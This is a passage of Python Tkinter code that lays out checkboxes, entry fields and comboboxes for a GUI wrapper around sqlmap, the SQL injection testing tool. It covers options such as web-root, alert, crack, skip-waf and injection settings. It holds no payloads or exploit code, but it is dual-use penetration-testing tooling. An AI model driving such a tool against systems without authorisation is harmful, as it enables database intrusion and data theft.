        self.e_csv_del.config(textvariable=self.e_csv_del_value, state='disabled', width=12)
        self.e_csv_del['values'] = (',', '.')
        self.e_csv_del.current(0)
        self.e_csv_del.bind('<<ComboboxSelected>>', self.f_csv_del)
        self.e_csv_del.grid(row=4, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
        self.chk_table_prefix = ttk.Checkbutton(data_settings)
        self.chk_table_prefix_var = tkinter.StringVar()
        self.chk_table_prefix.config(text="table-prefix", variable=self.chk_table_prefix_var, onvalue="on",
                                     offvalue="off", command=self.f_table_prefix)
        self.chk_table_prefix.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_table_prefix = ttk.Combobox(data_settings)
        self.e_table_prefix_value = tkinter.StringVar()
        self.e_table_prefix.config(textvariable=self.e_table_prefix_value, state='disabled', width=12)
        self.e_table_prefix['values'] = 'foobar'
        self.e_table_prefix.current(0)
        self.e_table_prefix.bind('<<ComboboxSelected>>', self.f_table_prefix)
        self.e_table_prefix.grid(row=5, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # LABELFRAME START SESSIONFILE
        # --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
        self.chk_test_filter = ttk.Checkbutton(advanced_settings)
        self.chk_test_filter_var = tkinter.StringVar()
        self.chk_test_filter.config(text="test-filter", variable=self.chk_test_filter_var, onvalue="on",
                                    offvalue="off", command=self.f_test_filter)
        self.chk_test_filter.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_test_filter = ttk.Combobox(advanced_settings)
        self.e_test_filter_value = tkinter.StringVar()
        self.e_test_filter.config(textvariable=self.e_test_filter_value, state='disabled', width=12)
        self.e_test_filter['values'] = ('ORDER BY', 'GROUP BY', 'NULL', 'HAVING', 'EXEC')
        self.e_test_filter.current(0)
        self.e_test_filter.bind('<<ComboboxSelected>>', self.f_test_filter)
        self.e_test_filter.grid(row=0, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --preprocess        Use given script(s) for preprocessing of response data
        self.chk_preprocess = ttk.Checkbutton(advanced_settings)
        self.chk_preprocess_var = tkinter.StringVar()
        self.chk_preprocess.config(text="preprocess", variable=self.chk_preprocess_var, onvalue="on",
                                   offvalue="off", command=self.f_pre_process)
        self.chk_preprocess.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_preprocess_var = tkinter.StringVar()
        self.e_preprocess = ttk.Entry(advanced_settings, width=12, textvariable=self.e_preprocess_var)
        self.e_preprocess.grid(row=2, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        self.e_preprocess.columnconfigure(0, weight=1)
        # --postprocess        Use given script(s) for postprocessing of response data
        self.chk_post_process = ttk.Checkbutton(advanced_settings)
        self.chk_post_process_var = tkinter.StringVar()
        self.chk_post_process.config(text="postprocess", variable=self.chk_post_process_var, onvalue="on",
                                     offvalue="off", command=self.f_post_process)
        self.chk_post_process.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_post_process_var = tkinter.StringVar()
        self.e_post_process = ttk.Entry(advanced_settings, width=12, textvariable=self.e_post_process_var)
        self.e_post_process.grid(row=3, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        self.e_post_process.columnconfigure(0, weight=1)
        # --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
        self.chk_test_skip = ttk.Checkbutton(advanced_settings)
        self.chk_test_skip_var = tkinter.StringVar()
        self.chk_test_skip.config(text="test-skip", variable=self.chk_test_skip_var, onvalue="on",
                                  offvalue="off", command=self.f_test_skip)
        self.chk_test_skip.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_test_skip = ttk.Combobox(advanced_settings)
        self.e_test_skip_value = tkinter.StringVar()
        self.e_test_skip.config(textvariable=self.e_test_skip_value, state='disabled', width=12)
        self.e_test_skip['values'] = ('BENCHMARK', 'CHAR', 'NULL')
        self.e_test_skip.current(0)
        self.e_test_skip.bind('<<ComboboxSelected>>', self.f_test_skip)
        self.e_test_skip.grid(row=1, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --disable-precon      Disable preconnection of sqlmap (check for 200 answer - may abuse some WAFs)
        self.chk_disable_precon = ttk.Checkbutton(developer_options)
        self.chk_disable_precon_var = tkinter.StringVar()
        self.chk_disable_precon.config(text="disable-precon", variable=self.chk_disable_precon_var, onvalue="on",
                                       offvalue="off", command=self.f_disable_precon)
        self.chk_disable_precon.grid(row=8, column=0, sticky='w', pady=2)
        # --dump-file=DUMP.. Store dumped data to a custom file
        self.chk_dump_file = ttk.Checkbutton(file_settings)
        self.chk_dump_file_var = tkinter.StringVar()
        self.chk_dump_file.config(text="dump-file", variable=self.chk_dump_file_var, onvalue="on",
                                  offvalue="off", command=self.f_dump_file)
        self.chk_dump_file.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_dump_file_var = tkinter.StringVar()
        self.e_dump_file = ttk.Entry(file_settings, width=12, textvariable=self.e_dump_file_var)
        self.e_dump_file.grid(row=4, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --abort-on-empty Abort data retrieval on empty results
        self.chk_abort_on_empty = ttk.Checkbutton(data_settings)
        self.chk_abort_on_empty_var = tkinter.StringVar()
        self.chk_abort_on_empty.config(text="abort-on-empty", variable=self.chk_abort_on_empty_var, onvalue="on",
                                       offvalue="off", command=self.f_abort_on_empty)
        self.chk_abort_on_empty.grid(row=9, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # -s SESSIONFILE      Save and resume all data retrieved on a session file
        self.chk_session_file = ttk.Checkbutton(file_settings)
        self.chk_session_file_var = tkinter.StringVar()
        self.chk_session_file.config(text="session file (-s)", variable=self.chk_session_file_var, onvalue="on",
                                     offvalue="off", command=self.f_session_file)
        self.chk_session_file.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_session_file_var = tkinter.StringVar()
        self.e_session_file = ttk.Entry(file_settings, width=12, textvariable=self.e_session_file_var)
        self.e_session_file.grid(row=2, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # -t TRAFFICFILE      Log all HTTP traffic into a textual file
        self.chk_traffic_file = ttk.Checkbutton(file_settings)
        self.chk_read_traffic_file_var = tkinter.StringVar()
        self.chk_traffic_file.config(text="traffic log (-t)", variable=self.chk_read_traffic_file_var, onvalue="on",
                                     offvalue="off", command=self.f_read_traffic_file)
        self.chk_traffic_file.grid(row=6, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)

        self.e_traffic_file_var = tkinter.StringVar()
        self.e_traffic_file = ttk.Entry(file_settings, width=12, textvariable=self.e_traffic_file_var)
        self.e_traffic_file.grid(row=6, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --output-dir=OUT..  Custom output directory path
        self.chk_output_dir = ttk.Checkbutton(file_settings)
        self.chk_output_dir_var = tkinter.StringVar()
        self.chk_output_dir.config(text="output-dir", variable=self.chk_output_dir_var, onvalue="on",
                                   offvalue="off", command=self.f_output_dir)
        self.chk_output_dir.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_output_dir_var = tkinter.StringVar()
        self.e_output_dir = ttk.Entry(file_settings, width=12, textvariable=self.e_output_dir_var)
        self.e_output_dir.grid(row=3, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --save=SAVECONFIG   Save options to a configuration INI file
        self.chk_save = ttk.Checkbutton(file_settings)
        self.chk_Save_var = tkinter.StringVar()
        self.chk_save.config(text="save", variable=self.chk_Save_var, onvalue="on",
                             offvalue="off", command=self.f_save)
        self.chk_save.grid(row=9, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.var_save_config = tkinter.StringVar()
        self.e_save_config = ttk.Entry(file_settings, width=12, textvariable=self.var_save_config)
        self.e_save_config.grid(row=9, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --scope=SCOPE       Regexp to filter targets from provided proxy log
        self.chk_scope = ttk.Checkbutton(discovery_settings)
        self.chk_scope_var = tkinter.StringVar()
        self.chk_scope.config(text="scope", variable=self.chk_scope_var, onvalue="on",
                              offvalue="off", command=self.f_scope)
        self.chk_scope.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_scope = ttk.Entry(discovery_settings, width=12)
        self.e_scope.grid(row=3, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --har=HARFILE       Log all HTTP traffic into a HAR file
        self.chk_har = ttk.Checkbutton(file_settings)
        self.chk_har_var = tkinter.StringVar()
        self.chk_har.config(text="har", variable=self.chk_har_var, onvalue="on",
                            offvalue="off", command=self.f_har)
        self.chk_har.grid(row=7, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.var_har_file = tkinter.StringVar()
        self.e_har = ttk.Entry(file_settings, width=12, textvariable=self.var_har_file)
        self.e_har.grid(row=7, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --report-json Store run results to a JSON file
        self.chk_report_json = ttk.Checkbutton(file_settings)
        self.chk_report_json_var = tkinter.StringVar()
        self.chk_report_json.config(text="report-json", variable=self.chk_report_json_var, onvalue="on",
                                    offvalue="off", command=self.f_report_json)
        self.chk_report_json.grid(row=8, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_report_json_var = tkinter.StringVar()
        self.e_report_json = ttk.Entry(file_settings, width=12, textvariable=self.e_report_json_var)
        self.e_report_json.grid(row=8, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # MISCELLANEOUS
        # https://github.com/sqlmapproject/sqlmap/commit/5650abbb4a1a35d7b51a53cb62e4f272a2fe69c5#diff-136d7f40c753ef8815a16d28370a9294
        # --skip-heuristics   Skip heuristic detection of SQLi/XSS vulnerabilities
        self.chk_skip_heuristics = ttk.Checkbutton(discovery_settings)
        self.chk_skip_heuristics_var = tkinter.StringVar()
        self.chk_skip_heuristics.config(text="skip-heuristics", variable=self.chk_skip_heuristics_var, onvalue="on",
                                        offvalue="off", command=self.f_skip_heuristics)
        self.chk_skip_heuristics.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --skip-waf          Skip heuristic detection of WAF/IPS/IDS protection
        self.chk_skip_waf = ttk.Checkbutton(discovery_settings)
        self.chk_skip_waf_var = tkinter.StringVar()
        self.chk_skip_waf.config(text="skip-waf", variable=self.chk_skip_waf_var, onvalue="on",
                                 offvalue="off", command=self.f_skip_waf)
        self.chk_skip_waf.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --offline           Work in offline mode (only use session data)
        self.chk_offline = ttk.Checkbutton(run_settings)
        self.chk_offline_var = tkinter.StringVar()
        self.chk_offline.config(text="offline", variable=self.chk_offline_var, onvalue="on",
                                offvalue="off", command=self.f_offline)
        self.chk_offline.grid(row=3, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --timeless          Use HTTP/2 timeless timing (faster, no delay)
        self.chk_timeless = ttk.Checkbutton(performance_settings)
        self.chk_timeless_var = tkinter.StringVar()
        self.chk_timeless.config(text="timeless", variable=self.chk_timeless_var, onvalue="on",
                                 offvalue="off", command=self.f_timeless)
        self.chk_timeless.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --wizard            Simple wizard interface for beginner users
        self.chk_wizard = ttk.Checkbutton(run_settings)
        self.chk_wizard_var = tkinter.StringVar()
        self.chk_wizard.config(text="wizard", variable=self.chk_wizard_var, onvalue="on",
                               offvalue="off", command=self.f_wizard)
        self.chk_wizard.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --dummy
        self.chk_dummy = ttk.Checkbutton(developer_options)
        self.chk_dummy_var = tkinter.StringVar()
        self.chk_dummy.config(text="dummy", variable=self.chk_dummy_var, onvalue="on",
                              offvalue="off", command=self.f_dummy)
        self.chk_dummy.grid(row=0, column=0, sticky='w', pady=2)
        # --smoke-test
        self.chk_smoke_test = ttk.Checkbutton(developer_options)
        self.chk_smoke_test_var = tkinter.StringVar()
        self.chk_smoke_test.config(text="smoke-test", variable=self.chk_smoke_test_var, onvalue="on",
                                   offvalue="off", command=self.f_smoke_test)
        self.chk_smoke_test.grid(row=1, column=0, sticky='w', pady=2)
        # --dependencies      Check for missing sqlmap dependencies
        self.chk_dependencies = ttk.Checkbutton(performance_settings)
        self.chk_dependencies_var = tkinter.StringVar()
        self.chk_dependencies.config(text="dependencies", variable=self.chk_dependencies_var, onvalue="on",
                                     offvalue="off", command=self.f_dependencies)
        self.chk_dependencies.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --mobile            Imitate smartphone through HTTP User-Agent header
        self.chk_mobile = ttk.Checkbutton(discovery_settings)
        self.chk_mobile_var = tkinter.StringVar()
        self.chk_mobile.config(text="mobile", variable=self.chk_mobile_var, onvalue="on",
                               offvalue="off", command=self.f_mobile)
        self.chk_mobile.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
        self.chk_cleanup = ttk.Checkbutton(advanced_settings)
        self.chk_cleanup_var = tkinter.StringVar()
        self.chk_cleanup.config(text="cleanup", variable=self.chk_cleanup_var, onvalue="on",
                                offvalue="off", command=self.f_cleanup)
        self.chk_cleanup.grid(row=9, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --purge      Safely remove all content from output directory
        self.chk_purge = ttk.Checkbutton(advanced_settings)
        self.chk_purge_var = tkinter.StringVar()
        self.chk_purge.config(text="purge", variable=self.chk_purge_var, onvalue="on",
                              offvalue="off", command=self.f_purge)
        self.chk_purge.grid(row=10, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --time-limit  Run with a time limit in seconds (e.g. 3600)
        self.chk_time_limit = ttk.Checkbutton(run_settings)
        self.chk_time_limit_var = tkinter.StringVar()
        self.chk_time_limit.config(text="time-limit", variable=self.chk_time_limit_var, onvalue="on",
                                   offvalue="off", command=self.f_time_limit)
        self.chk_time_limit.grid(row=2, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_time_limit = ttk.Combobox(run_settings)
        self.e_time_limit_value = tkinter.StringVar()
        self.e_time_limit.config(textvariable=self.e_time_limit_value, state='disabled', width=12)
        self.e_time_limit['values'] = ['3600', '4600', '5600']
        self.e_time_limit.current(0)
        self.e_time_limit.bind('<<ComboboxSelected>>', self.f_time_limit)
        self.e_time_limit.grid(row=2, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --disable-hashing     Disable hash analysis on table dumps
        self.chk_disable_hashing = ttk.Checkbutton(data_settings)
        self.chk_disable_hashing_var = tkinter.StringVar()
        self.chk_disable_hashing.config(text="disable-hashing", variable=self.chk_disable_hashing_var, onvalue="on",
                                        offvalue="off", command=self.f_disable_hashing)
        self.chk_disable_hashing.grid(row=11, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --unsafe-naming     Disable escaping of DBMS identifiers (e.g. \"user\")
        self.chk_unsafe_naming = ttk.Checkbutton(data_settings)
        self.chk_unsafe_naming_var = tkinter.StringVar()
        self.chk_unsafe_naming.config(text="unsafe-naming", variable=self.chk_unsafe_naming_var, onvalue="on",
                                      offvalue="off", command=self.f_unsafe_naming)
        self.chk_unsafe_naming.grid(row=12, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --base64     Parameter(s) containing Base64 encoded values
        self.chk_base64 = ttk.Checkbutton(data_settings)
        self.chk_base64_var = tkinter.StringVar()
        self.chk_base64.config(text="base64", variable=self.chk_base64_var, onvalue="on",
                               offvalue="off", command=self.f_base64)
        self.chk_base64.grid(row=7, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --base64-safe    Use URL and filename safe Base64 alphabet
        # (Reference: https://en.wikipedia.org/wiki/Base64#URL_applications)
        self.chk_base64safe = ttk.Checkbutton(data_settings)
        self.chk_base64safe_var = tkinter.StringVar()
        self.chk_base64safe.config(text='base64-safe', variable=self.chk_base64safe_var, onvalue="on",
                                   offvalue="off", command=self.f_base64safe)
        self.chk_base64safe.grid(row=8, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --disable-coloring            Disable console output coloring
        self.chk_disable_coloring = ttk.Checkbutton(display_settings)
        self.chk_disable_coloring_var = tkinter.StringVar()
        self.chk_disable_coloring.config(text="disable-coloring", variable=self.chk_disable_coloring_var, onvalue="on",
                                         offvalue="off", command=self.f_disable_coloring)
        self.chk_disable_coloring.grid(row=6, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --beep              Sound alert when SQL injection found
        self.chk_beep = ttk.Checkbutton(display_settings)
        self.chk_beep_var = tkinter.StringVar()
        self.chk_beep.config(text="beep", variable=self.chk_beep_var, onvalue="on",
                             offvalue="off", command=self.f_beep)
        self.chk_beep.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --shell      Prompt for an interactive sqlmap shell
        self.chk_sqlmap_shell = ttk.Checkbutton(run_settings)
        self.chk_sqlmap_shell_var = tkinter.StringVar()
        self.chk_sqlmap_shell.config(text="shell", variable=self.chk_sqlmap_shell_var, onvalue="on",
                                     offvalue="off", command=self.f_sqlmap_shell)
        self.chk_sqlmap_shell.grid(row=7, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --vuln-test
        self.chk_vuln_test = ttk.Checkbutton(developer_options)
        self.chk_vuln_test_var = tkinter.StringVar()
        self.chk_vuln_test.config(text="vuln-test", variable=self.chk_vuln_test_var, onvalue="on",
                                  offvalue="off", command=self.f_vuln_test)
        self.chk_vuln_test.grid(row=2, column=0, sticky='w', pady=2)
        # --web-root=WEBROOT    Web server document root directory (e.g. "/var/www")
        self.chk_web_root = ttk.Checkbutton(advanced_settings)
        self.chk_web_root_var = tkinter.StringVar()
        self.chk_web_root.config(text="web-root", variable=self.chk_web_root_var, onvalue="on",
                                 offvalue="off", command=self.f_web_root)
        self.chk_web_root.grid(row=4, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_web_root = ttk.Combobox(advanced_settings)
        self.e_web_root_value = tkinter.StringVar()
        self.e_web_root.config(textvariable=self.e_web_root_value, state='disabled', width=12)
        self.e_web_root['values'] = ['/var/www/', '/home/www/', '/var/www/html/']
        self.e_web_root.current(0)
        self.e_web_root.bind('<<ComboboxSelected>>', self.f_web_root)
        self.e_web_root.grid(row=4, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # --gpage=GOOGLEPAGE  Use Google dork results from specified page number
        self.chk_gpage = ttk.Checkbutton(discovery_settings)
        self.chk_gpage_var = tkinter.StringVar()
        self.chk_gpage.config(text="gpage", variable=self.chk_gpage_var, onvalue="on",
                              offvalue="off", command=self.f_gpage)
        self.chk_gpage.grid(row=7, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_gpage = ttk.Entry(discovery_settings, width=12)
        self.e_gpage.grid(row=7, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        #
        # -z                  Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
        self.chk_z = ttk.Checkbutton(advanced_settings)
        self.chk_z_var = tkinter.StringVar()
        self.chk_z.config(text="z", variable=self.chk_z_var, onvalue="on",
                          offvalue="off", command=self.f_z)
        self.chk_z.grid(row=6, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_z = ttk.Entry(advanced_settings, width=12)
        self.e_z.grid(row=6, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        #
        # --tmp-dir=TMPDIR    Local directory for storing temporary files
        self.chk_tmp_dir = ttk.Checkbutton(advanced_settings)
        self.chk_tmp_dir_var = tkinter.StringVar()
        self.chk_tmp_dir.config(text="tmp-dir", variable=self.chk_tmp_dir_var, onvalue="on",
                                offvalue="off", command=self.f_tmp_dir)
        self.chk_tmp_dir.grid(row=5, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_tmp_dir = ttk.Entry(advanced_settings, width=12)
        self.e_tmp_dir.grid(row=5, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        #
        # --alert=ALERT       Run shell command(s) when SQL injection is found
        self.chk_alert = ttk.Checkbutton(advanced_settings)
        self.chk_alert_var = tkinter.StringVar()
        self.chk_alert.config(text="alert", variable=self.chk_alert_var, onvalue="on",
                              offvalue="off", command=self.f_alert)
        self.chk_alert.grid(row=7, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_alert = ttk.Entry(advanced_settings, width=12)
        self.e_alert.grid(row=7, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        #
        # --crack             Load and crack hashes from a file (standalone)
        self.chk_crack = ttk.Checkbutton(advanced_settings)
        self.chk_crack_var = tkinter.StringVar()
        self.chk_crack.config(text="crack", variable=self.chk_crack_var, onvalue="on",
                              offvalue="off", command=self.f_crack)
        self.chk_crack.grid(row=8, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_crack_var = tkinter.StringVar()
        self.e_crack = ttk.Entry(advanced_settings, width=12, textvariable=self.e_crack_var)
        self.e_crack.grid(row=8, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        #
        # --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
        self.chk_answers = ttk.Checkbutton(run_settings)
        self.chk_answers_var = tkinter.StringVar()
        self.chk_answers.config(text="answers", variable=self.chk_answers_var, onvalue="on",
                                offvalue="off", command=self.f_answers)
        self.chk_answers.grid(row=1, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        #
        self.e_answers = ttk.Combobox(run_settings)
        self.e_answers_value = tkinter.StringVar()
        self.e_answers.config(textvariable=self.e_answers_value, state='disabled', width=12)
        self.e_answers['values'] = ['process=Y', 'process=Y,proceed=C', 'process=Y,proceed=C,value=Y',
                                    'process=Y,proceed=C,test=Y,value=Y', 'proceed=C', 'proceed=C,value=Y',
                                    'proceed=C,test=Y,value=Y', 'continue=Y']
        self.e_answers.current(0)
        self.e_answers.bind('<<ComboboxSelected>>', self.f_answers)
        self.e_answers.grid(row=1, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        #
        # --debug
        self.chk_debug = ttk.Checkbutton(developer_options)
        self.chk_debug_var = tkinter.StringVar()
        self.chk_debug.config(text="debug", variable=self.chk_debug_var, onvalue="on",
                              offvalue="off", command=self.f_debug)
        self.chk_debug.grid(row=3, column=0, sticky='w', pady=2)
        # --disable-stats
        self.chk_disable_stats = ttk.Checkbutton(developer_options)
        self.chk_disable_stats_var = tkinter.StringVar()
        self.chk_disable_stats.config(text="disable-stats", variable=self.chk_disable_stats_var, onvalue="on",
                                      offvalue="off", command=self.f_disable_stats)
        self.chk_disable_stats.grid(row=9, column=0, sticky='w', pady=2)
        # --profile
        self.chk_profile = ttk.Checkbutton(developer_options)
        self.chk_profile_var = tkinter.StringVar()
        self.chk_profile.config(text="profile", variable=self.chk_profile_var, onvalue="on",
                                offvalue="off", command=self.f_profile)
        self.chk_profile.grid(row=4, column=0, sticky='w', pady=2)
        # --force-dbms
        self.chk_force_dbms = ttk.Checkbutton(developer_options)
        self.chk_force_dbms_var = tkinter.StringVar()
        self.chk_force_dbms.config(text="force-dbms", variable=self.chk_force_dbms_var, onvalue="on",
                                   offvalue="off", command=self.f_force_dbms)
        self.chk_force_dbms.grid(row=5, column=0, sticky='w', pady=2)
        # --force-dns
        self.chk_force_dns = ttk.Checkbutton(developer_options)
        self.chk_force_dns_var = tkinter.StringVar()
        self.chk_force_dns.config(text="force-dns", variable=self.chk_force_dns_var, onvalue="on",
                                  offvalue="off", command=self.f_force_dns)
        self.chk_force_dns.grid(row=6, column=0, sticky='w', pady=2)
        # --force-pivoting
        self.chk_force_pivoting = ttk.Checkbutton(developer_options)
        self.chk_force_pivoting_var = tkinter.StringVar()
        self.chk_force_pivoting.config(text="force-pivoting", variable=self.chk_force_pivoting_var, onvalue="on",
                                       offvalue="off", command=self.f_force_pivoting)
        self.chk_force_pivoting.grid(row=7, column=0, sticky='w', pady=2)
        # --unstable    If the target is unstable
        self.chk_unstable = ttk.Checkbutton(run_settings)
        self.chk_unstable_var = tkinter.StringVar()
        self.chk_unstable.config(text="unstable", variable=self.chk_unstable_var, onvalue="on",
                                 offvalue="off", command=self.f_unstable)
        self.chk_unstable.grid(row=4, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --results-file    Location of CSV results file in multiple targets mode
        self.chk_result_file = ttk.Checkbutton(file_settings)
        self.chk_result_file_var = tkinter.StringVar()
        self.chk_result_file.config(text="results-file…", variable=self.chk_result_file_var, onvalue="on",
                                    offvalue="off", command=self.f_result_file)
        self.chk_result_file.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --no-truncate       Disable console output truncation (e.g. long entr...)
        self.chk_no_truncate = ttk.Checkbutton(display_settings)
        self.chk_no_truncate_var = tkinter.StringVar()
        self.chk_no_truncate.config(text="no-truncate", variable=self.chk_no_truncate_var, onvalue="on",
                                    offvalue="off", command=self.f_no_truncate)
        self.chk_no_truncate.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # OPTIMIZATIONS, FINGERPRINT, VERBOSE
        #
        self.chk_optimization = ttk.Checkbutton(performance_settings)
        self.chk_optimization_var = tkinter.StringVar()
        self.chk_optimization.config(text="optimize (-o)", variable=self.chk_optimization_var, onvalue="on",
                                     offvalue="off", command=self.f_optimization)
        self.chk_optimization.grid(row=0, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --no-keep-alive     Disable persistent HTTP(s) connections (Keep-Alive)
        self.chk_no_keep_alive = ttk.Checkbutton(performance_settings)
        self.chk_no_keep_alive_var = tkinter.StringVar()
        self.chk_no_keep_alive.config(text="no-keep-alive", variable=self.chk_no_keep_alive_var, onvalue="on",
                                   offvalue="off", command=self.f_no_keep_alive)
        self.chk_no_keep_alive.grid(row=1, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --null-connection   Retrieve page length without actual HTTP response body
        self.chk_null_connection = ttk.Checkbutton(performance_settings)
        self.chk_null_connection_var = tkinter.StringVar()
        self.chk_null_connection.config(text="null-connection", variable=self.chk_null_connection_var, onvalue="on",
                                        offvalue="off", command=self.f_null_connection)
        self.chk_null_connection.grid(row=2, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
        self.chk_threads = ttk.Checkbutton(performance_settings)
        self.chk_threads_var = tkinter.StringVar()
        self.chk_threads.config(text="threads", variable=self.chk_threads_var, onvalue="on",
                                offvalue="off", command=self.f_threads)
        self.chk_threads.grid(row=3, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        self.threads = ttk.Combobox(performance_settings)
        self.threads_value = tkinter.StringVar()
        self.threads.config(textvariable=self.threads_value, state='disable', width=12)
        self.threads['values'] = ('1', '2', '3', '4', '5', '6', '7', '8', '9', '10')
        self.threads.current(0)
        self.threads.bind('<<ComboboxSelected>>', self.f_threads)
        self.threads.grid(row=3, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # -f, --fingerprint   Perform an extensive DBMS version fingerprint
        self.chk_finger_print = ttk.Checkbutton(performance_settings)
        self.chk_finger_print_var = tkinter.StringVar()
        self.chk_finger_print.config(text="fingerprint", variable=self.chk_finger_print_var, onvalue="on",
                                     offvalue="off", command=self.f_finger_print)
        self.chk_finger_print.grid(row=5, column=0, columnspan=2, sticky='w', padx=(0, 0), pady=3)
        # -v VERBOSE            Verbosity level: 0-6 (default 1)
        self.chk_verbose = ttk.Checkbutton(display_settings)
        self.chk_verbose_var = tkinter.StringVar()
        self.chk_verbose.config(text="verbose", variable=self.chk_verbose_var, onvalue="on",
                                offvalue="off", command=self.f_verbose)
        self.chk_verbose.grid(row=0, column=0, columnspan=1, sticky='w', padx=(0, 8), pady=3)
        self.e_verbose = ttk.Combobox(display_settings)
        self.e_verbose_value = tkinter.StringVar()
        self.e_verbose.config(textvariable=self.e_verbose_value, state='disabled', width=12)
        self.e_verbose['values'] = ('0', '1', '2', '3', '4', '5', '6')
        self.e_verbose.current(0)
        self.e_verbose.bind('<<ComboboxSelected>>', self.f_verbose)
        self.e_verbose.grid(row=0, column=1, columnspan=1, sticky='ew', padx=(0, 0), pady=3)
        # INJECTION | DETECTION | TECHNIQUE
        paned_i_t_o = ttk.Frame(s_det_tech_f)
        paned_i_t_o.rowconfigure(0, weight=1)
        paned_i_t_o.columnconfigure(0, weight=3, uniform="options")
        paned_i_t_o.columnconfigure(1, weight=2, uniform="options")
        # INJECTION
        injection_lf = ttk.Labelframe(paned_i_t_o, text='Injection')
        injection_lf.rowconfigure(0, weight=1)
        injection_lf.columnconfigure(0, minsize=125)
        injection_lf.columnconfigure(1, weight=1)
        # TAMPERS
        tampers_lf = ttk.Labelframe(paned_i_t_o, text='Tampers')
        tampers_lf.rowconfigure(0, weight=1)
        tampers_lf.columnconfigure(0, weight=1)
        #
        injection_lf.grid(row=0, column=0, sticky='nsew', padx=(0, 4))
        tampers_lf.grid(row=0, column=1, sticky='nsew')
        paned_i_t_o.grid(row=0, column=0, pady=4, sticky='we')
        # --dbms=DBMS         Force back-end DBMS to this value
